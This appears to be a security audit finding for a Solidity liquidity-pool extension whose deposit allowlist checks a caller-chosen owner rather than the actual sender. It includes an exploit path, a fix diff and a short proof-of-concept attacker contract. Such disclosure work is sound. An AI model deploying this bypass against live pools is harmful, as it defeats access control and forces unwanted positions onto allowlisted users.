Audit Report

## Title
`DepositAllowlistExtension.beforeAddLiquidity` gates on caller-supplied `owner` instead of actual caller `sender`, allowing any address to bypass the deposit allowlist — (`metric-periphery/contracts/extensions/DepositAllowlistExtension.sol`)

## Summary
`DepositAllowlistExtension.beforeAddLiquidity` silently discards the `sender` argument (the real `msg.sender` of `addLiquidity`) and instead validates `owner`, which is a free parameter supplied by the caller. Because any address can name an allowlisted address as `owner`, the deposit restriction is completely inoperative: an unprivileged attacker can inject liquidity into a restricted pool and force LP shares onto an allowlisted address it never consented to hold.

## Finding Description
`MetricOmmPool.addLiquidity` passes the real caller as the first argument to the before-hook:

```solidity
// MetricOmmPool.sol:191
_beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
``` [1](#0-0) 

The extension interface therefore receives `(sender=msg.sender, owner=caller_chosen, ...)`. `SwapAllowlistExtension` correctly reads the first parameter:

```solidity
// SwapAllowlistExtension.sol:31,37
function beforeSwap(address sender, address, ...) ...
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
``` [2](#0-1) 

`DepositAllowlistExtension` does the opposite — the first parameter is unnamed (discarded) and the check is on `owner`:

```solidity
// DepositAllowlistExtension.sol:32-42
function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    ...
}
``` [3](#0-2) 

**Exploit path:**
1. Pool `P` uses `DepositAllowlistExtension`; only address `A` is in `allowedDepositor[P]`.
2. Attacker `X` (not allowlisted) calls `pool.addLiquidity(owner=A, salt, deltas, callbackData, extensionData)` directly, or via `MetricOmmPoolLiquidityAdder.addLiquidityExactShares(pool, A, ...)`.
3. The extension evaluates `allowedDepositor[pool][A]` → `true`. Guard passes.
4. `X` satisfies the `metricOmmModifyLiquidityCallback` from its own token balance.
5. LP shares are minted to `A` under `X`'s chosen `salt`.

`MetricOmmPoolLiquidityAdder._validateOwner` only rejects `address(0)`, providing no additional barrier: [4](#0-3) 

## Impact Explanation
The deposit allowlist — the sole access-control mechanism for restricted pools — is rendered completely inoperative. Any unprivileged EOA or contract can add liquidity to a pool that is supposed to be permissioned. Additionally, allowlisted addresses receive LP shares they never requested, exposing them to impermanent loss and locking position keys under attacker-chosen `salt` values, potentially blocking their own future deposits to the same `(owner, salt)` key. Unauthorized liquidity injection also shifts bin totals and the active bin cursor, distorting oracle-anchored swap execution for all subsequent traders. This constitutes a broken core pool access-control invariant with direct fund-impacting consequences for both the forced LP recipient and pool traders.

## Likelihood Explanation
No special privilege is required. Any EOA or contract can call `addLiquidity` directly on the pool or route through the public `MetricOmmPoolLiquidityAdder`. The only prerequisite is knowing one allowlisted address, which is trivially discoverable from `AllowedToDepositSet` events emitted by `setAllowedToDeposit`. The attack is repeatable with any allowlisted address and any salt. [5](#0-4) 

## Recommendation
Replace the unnamed first parameter with `sender` and gate on it, mirroring `SwapAllowlistExtension`:

```diff
- function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
+ function beforeAddLiquidity(address sender, address, uint80, LiquidityDelta calldata, bytes calldata)
      external view override returns (bytes4)
  {
-     if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
+     if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][sender]) {
          revert IMetricOmmPoolActions.NotAllowedToDeposit();
      }
      return IMetricOmmExtensions.beforeAddLiquidity.selector;
  }
```

Also update `setAllowedToDeposit`, `isAllowedToDeposit`, and the `IDepositAllowlistExtension` interface NatSpec to clarify that the allowlisted address is the **caller** of `addLiquidity`, not the position owner.

## Proof of Concept

```solidity
contract Bypass is IMetricOmmModifyLiquidityCallback {
    function attack(
        address pool,
        address allowlistedOwner,
        LiquidityDelta calldata deltas
    ) external {
        // allowlistedOwner is allowlisted; attacker (address(this)) is not.
        // Extension checks owner, so allowedDepositor[pool][allowlistedOwner] == true → passes.
        IMetricOmmPoolActions(pool).addLiquidity(
            allowlistedOwner, 0, deltas, "", ""
        );
    }

    function metricOmmModifyLiquidityCallback(
        uint256 a0, uint256 a1, bytes calldata
    ) external override {
        PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
        if (a0 > 0) IERC20(imm.token0).transfer(msg.sender, a0);
        if (a1 > 0) IERC20(imm.token1).transfer(msg.sender, a1);
    }
}
```

After `attack()`:
- `allowlistedOwner` holds LP shares it never requested (impermanent-loss exposure, locked position key).
- The pool accepted liquidity from an address the allowlist was meant to exclude.
- Bin totals and cursor are shifted, affecting all subsequent swaps.
